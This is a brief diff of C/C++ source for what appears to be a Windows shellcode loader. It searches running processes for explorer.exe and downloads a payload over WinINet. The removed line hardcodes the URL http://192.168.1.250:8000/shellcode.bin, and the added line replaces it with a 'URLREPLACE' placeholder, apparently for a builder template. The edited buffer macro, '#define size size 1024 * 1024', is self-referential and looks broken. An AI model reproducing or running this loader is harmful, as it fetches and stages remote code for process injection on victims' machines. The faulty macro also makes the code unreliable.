@@ -13,7 +13,7 @@ typedef std::string String;
 #else
 typedef std::wstring String;
 #endif
-#define size 1024 * 60
+#define size size 1024 * 1024
 unsigned char Buffer[size];
 unsigned int Buffer_len = sizeof(Buffer);
 
@@ -118,7 +118,7 @@ int main()
             if (stricmp(entry.szExeFile, "explorer.exe") == 0)
             {
 
-                char *url = (char *)"http://192.168.1.250:8000/shellcode.bin";
+                char *url = (char *)"URLREPLACE";
                 DWORD bytes_read;
                 HINTERNET internet = InternetOpen("HTTP Downloader", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
                 HINTERNET file_handle = InternetOpenUrl(internet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
